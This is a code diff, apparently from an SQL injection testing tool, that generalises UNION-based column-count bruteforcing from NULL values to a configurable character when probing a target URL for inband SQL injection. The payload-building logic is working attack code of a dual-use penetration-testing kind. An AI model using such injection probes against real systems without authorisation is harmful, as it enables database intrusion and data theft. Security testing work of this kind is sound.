@@ -90,21 +90,21 @@ def __unionConfirm(count=None, comment=None):
 
     return validPayload
 
-def __unionTestByNULLBruteforce(comment):
+def __unionTestByCharBruteforce(comment):
     """
     This method tests if the target url is affected by an inband
     SQL injection vulnerability. The test is done up to 50 columns
     on the target database table
     """
 
-    query = agent.prefixQuery("UNION ALL SELECT NULL")
+    query = agent.prefixQuery("UNION ALL SELECT %s" % conf.uChar)
 
     for count in range(1, conf.uCols+1):
         if kb.dbms == DBMS.ORACLE and query.endswith(" FROM DUAL"):
             query = query[:-len(" FROM DUAL")]
 
         if count:
-            query += ", NULL"
+            query += ", %s" % conf.uChar
 
         if kb.dbms == DBMS.ORACLE:
             query += " FROM DUAL"
@@ -151,8 +151,10 @@ def unionTest():
 
     if conf.uTech == "orderby":
         technique = "ORDER BY clause bruteforcing"
-    else:
+    elif conf.uChar == "NULL":
         technique = "NULL bruteforcing"
+    else:
+        technique = "char (%s) bruteforcing" % conf.uChar
 
     infoMsg  = "testing inband sql injection on parameter "
     infoMsg += "'%s' with %s technique" % (kb.injParameter, technique)
@@ -164,7 +166,7 @@ def unionTest():
         if conf.uTech == "orderby":
             validPayload = __unionTestByOrderBy(comment)
         else:
-            validPayload = __unionTestByNULLBruteforce(comment)
+            validPayload = __unionTestByCharBruteforce(comment)
 
         if validPayload:
             setUnion(comment=comment)
